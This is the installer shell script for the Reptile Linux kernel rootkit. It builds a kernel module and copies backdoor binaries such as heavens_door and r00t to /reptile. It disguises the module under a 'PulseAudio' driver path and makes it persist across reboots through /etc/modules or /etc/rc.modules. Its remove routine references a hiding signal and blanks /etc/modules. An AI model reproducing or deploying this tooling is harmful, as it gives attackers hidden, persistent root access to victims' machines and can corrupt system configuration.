#!/bin/bash
#
# Reptile Install Script
# Author: F0rb1dd3n

MODULE="rep_mod"
DRIVER="PulseAudio"
KERNEL_VERSION=$(uname -r)
DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"

function usage {
	echo -e "\n\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
	echo -e "\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;36mwriten by: F0rb1dd3n\e[00m\n"
	echo -e "Usage: $0 <arg>\n"
	echo -e "\tbuild\t\tCompile the module"
	echo -e "\tinstall\t\tCompile and install the module persistently"
	echo -e "\tremove\t\tRemove the persistence of module\n"
}

function reptile_init {
	echo -e "\n\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
	echo -e "\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;36mwriten by: F0rb1dd3n\e[00m\n"
	
	[ $(uname) != "Linux" ] && {
		echo "Not on a Linux system. Exiting..."
		exit
	}

	[ $(id -u) != 0 ] && {
		echo "Not root. Exiting..."
		exit
	}

	if [ ! -d $DRIVER_DIRECTORY ]; then
        	mkdir -p $DRIVER_DIRECTORY
    	fi

    	for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null)
       	do 
            	SYSTEM=${f:5:${#f}-13}
    	done

    	if [ "$SYSTEM" == "" ]; then
        	#TODO: error message
        	exit
    	fi
}

function reptile_build {
	echo -e "\n\e[00;31m############################### \e[01;36mBuilding...\e[00;31m ################################\e[00m\n"
	make all

	echo -e "\n\e[00;31m############################### \e[01;36mCleanning...\e[00;31m ###############################\e[00m\n" 
	make clean

	mv bin/$MODULE bin/$MODULE.ko
}

function reptile_install {
    	reptile_build

	echo -e "\n\e[00;31m############################################################################\e[00m\n" 
	
	mkdir -p /reptile && \
	cp bin/$MODULE.ko /reptile/$MODULE.ko && \
	cp bin/heavens_door /reptile && \
	cp bin/r00t /reptile && \
	cp bin/knock_on_heaven /reptile && \
	cp scripts/kill_door.sh /reptile && \
	cp scripts/start.sh /reptile && \
	cp scripts/cleanup.sh /reptile && \
	rm -rf bin && \
	echo -e "\e[01;36mAll binaries was copied to /reptile\e[00m" || {
		echo -e "\e[01;31mError on copying files to /reptile\e[00m"
		exit
	}

    	echo -ne "\nInstalling... "
    	
	cp "/reptile/$MODULE.ko" "$DRIVER_DIRECTORY" || echo -e "\e[01;31mERROR!\e[00m\n" 
    
    	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules
    	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/rc.modules
        	chmod +x /etc/rc.modules
	elif [ "$SYSTEM" == "arch" ]; then
        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules
    	fi
    	
	depmod && insmod /reptile/$MODULE.ko && echo -e "\e[01;36mDONE!\e[00m\n\n" || { echo -e "\e[01;31mERROR!\e[00m\n\n"; exit; }

	read -p "Would you like to remove this directory ($PWD) on exit? (YES/NO) (case-sensitive) [NO]: "
	if [ -z $REPLY ]; then
    		echo "Not removing $PWD"
	elif [ "$REPLY" == "YES" ]; then
    		rm -rf $PWD
	elif [ "$REPLY" == "NO" ]; then
    		echo "Not removing $PWD"
	else
    		echo "Invalid option. Not removing."
	fi

	echo -e "Instalation has finished!\n"
}

function reptile_remove {
	echo -e "\n\e[01;31mBe sure to unhide and unload the module or this script will not work properly!\e[00m"
	echo -e "Command: \e[01;32mkill -50 0 && rmmod reptile_mod\e[00m\n"
    	echo -ne "Uninstalling... "
	#kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'`
	rm -rf /reptile
	rm -rf $DRIVER_DIRECTORY
	rm -rf /etc/rc.modules
	echo '' > /etc/modules
	depmod && echo -e "\e[01;36mDONE!\e[00m\n\n" || echo -e "\e[01;31mERROR!\e[00m\n\n"
}

case $1 in
	build)
		reptile_build
		echo -e "\n\e[01;36mDONE!\e[00m\n"
		;;
    	install)
        	reptile_install
        	;;
    	remove)
        	reptile_remove
        	;;
	"")
		usage
		;;
esac
